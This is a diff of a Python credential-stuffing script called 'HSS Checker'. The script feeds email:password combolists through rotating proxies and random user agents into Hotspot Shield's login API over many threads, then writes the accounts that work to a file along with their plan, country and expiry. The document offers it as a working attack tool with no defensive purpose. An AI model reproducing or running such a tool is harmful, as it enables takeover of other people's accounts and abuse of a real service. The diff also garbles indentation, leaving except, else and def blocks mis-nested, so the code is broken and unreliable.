@@ -87,23 +87,23 @@ if choice == 0:
                 os.system('pause >nul')
                 quit()
 
-    with open(path, 'r', encoding="utf-8") as f:
-                for l in f:
-                    ip = l.split(":")[0]
+                with open(path, 'r', encoding="utf-8") as f:
+                    for l in f:
+                        ip = l.split(":")[0]
                     port = l.split(":")[1]
                     self.proxies.append({'http': proxytype+'://'+ip+':'+port.rstrip("\n")})
 
- except ValueError:
-            print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] Value must be an integer.')
-            os.system('pause >nul')
-            quit()
+                except ValueError:
+                print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] Value must be an integer.')
+                os.system('pause >nul')
+                quit()
 
 except Exception as e:
-            print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] Failed To Open Proxy File :(')
-            os.system('pause >nul')
-            quit()
+print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] Failed To Open Proxy File :(')
+os.system('pause >nul')
+quit()
 
- def getCombos(self):
+def getCombos(self):
         try:
             print(f'[{Fore.LIGHTBLUE_EX}>{Fore.LIGHTWHITE_EX}] Path to combolist> ')
             path = easygui.fileopenbox(default='*.txt', filetypes = ['*.txt'], title= 'HSS Checker - Select combos', multiple= False)
@@ -115,9 +115,9 @@ except Exception as e:
             os.system('pause >nul')
             quit()
 
- def checker(self, email, password):
-        try:     
-            client = requests.Session()
+            def checker(self, email, password):
+                try:     
+                    client = requests.Session()
             login = client.get("https://app.hotspotshield.com/api/user/login", headers ={"User-Agent": ua().random}, proxies =random.choice(self.proxies))
             soup = Soup(login.text,'html.parser')
             loginForm = soup.find('form')
@@ -137,7 +137,7 @@ if 'PWD INCORRECT' or '"status":false' in request.text:
                 self.bad += 1
                 self.lock.release()
 
- else:     
+else:     
                 info = client.get("https://app.hotspotshield.com/api/user/info", headers ={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" ,"Accept-Encoding": "gzip, deflate, br" ,"Accept-Language": "en-US,en;q=0.9" ,"Connection": "keep-alive" ,"Host": "www.hotspotshield.com" ,"Referer": "https://app.hotspotshield.com/account" ,"Sec-Fetch-Dest": "document" ,"Sec-Fetch-Mode": "navigate" ,"Sec-Fetch-Site": "same-origin" ,"Sec-Fetch-User": "?1" ,"Upgrade-Insecure-Requests": "1" ,"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"}, cookies =cookie, proxies =random.choice(self.proxies), timeout =10).text
                 plan = info.split('"plan":"')[1].split('"},')[0]
                 country = info.split('country":"')[1].split('",')[0]
@@ -149,47 +149,47 @@ if 'PWD INCORRECT' or '"status":false' in request.text:
                     fp.writelines(f'Email: {email} Pass: {password} - Plan: {plan} - Country: {country} - Validity: {expiry}\n')   
                 self.lock.release()\
 
-                 except:
-            self.lock.acquire()
-            print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] {Fore.LIGHTRED_EX}ERROR{Fore.RESET} | Proxy timeout. Change your proxies or use a different VPN')
-            self.retries += 1
-            self.lock.release()
+                except:
+                self.lock.acquire()
+                print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] {Fore.LIGHTRED_EX}ERROR{Fore.RESET} | Proxy timeout. Change your proxies or use a different VPN')
+                self.retries += 1
+                self.lock.release()
 
                 def worker(self, combos, thread_id):
-        while self.check[thread_id] < len(combos):
-            combination = combos[self.check[thread_id]].split(':')
-            self.checker(combination[0], combination[1])
-            self.check[thread_id] += 1 
+                        while self.check[thread_id] < len(combos):
+                            combination = combos[self.check[thread_id]].split(':')
+                        self.checker(combination[0], combination[1])
+                        self.check[thread_id] += 1 
 
-             def main(self):
-        self.ui()
-        self.getProxies()
-        self.getCombos()
-        try:
-            self.threadcount = int(input(f'[{Fore.LIGHTBLUE_EX}>{Fore.RESET}] Threads> '))
-        except ValueError:
-            print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] Value must be an integer')
-            os.system('pause >nul')
-            quit()
+                def main(self):
+                    self.ui()
+                self.getProxies()
+                self.getCombos()
+                try:
+                    self.threadcount = int(input(f'[{Fore.LIGHTBLUE_EX}>{Fore.RESET}] Threads> '))
+                except ValueError:
+                    print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] Value must be an integer')
+                    os.system('pause >nul')
+                    quit()
                
-        self.ui()
-        self.start = time.time()
-        threading.Thread(target =self.cpmCounter, daemon =True).start()
-        threading.Thread(target =self.updateTitle ,daemon =True).start()
+                    self.ui()
+                    self.start = time.time()
+                    threading.Thread(target =self.cpmCounter, daemon =True).start()
+                    threading.Thread(target =self.updateTitle ,daemon =True).start()
         
-        threads = []
-        self.check = [0 for i in range(self.threadcount)]
-        for i in range(self.threadcount):
-            sliced_combo = self.combos[int(len(self.combos) / self.threadcount * i): int(len(self.combos)/ self.threadcount* (i+1))]
-            t = threading.Thread(target= self.worker, args= (sliced_combo, i,) )
-            threads.append(t)
-            t.start()
+                    threads = []
+                    self.check = [0 for i in range(self.threadcount)]
+                    for i in range(self.threadcount):
+                        sliced_combo = self.combos[int(len(self.combos) / self.threadcount * i): int(len(self.combos)/ self.threadcount* (i+1))]
+                        t = threading.Thread(target= self.worker, args= (sliced_combo, i,) )
+                        threads.append(t)
+                        t.start()
 
-        for t in threads:
-            t.join()
+                        for t in threads:
+                         t.join()
 
-        print(f'[{Fore.LIGHTGREEN_EX}+{Fore.RESET}] Task completed')
-        os.system('pause>nul')
+                        print(f'[{Fore.LIGHTGREEN_EX}+{Fore.RESET}] Task completed')
+                        os.system('pause>nul')
         
 n = HSS()
 n.main()
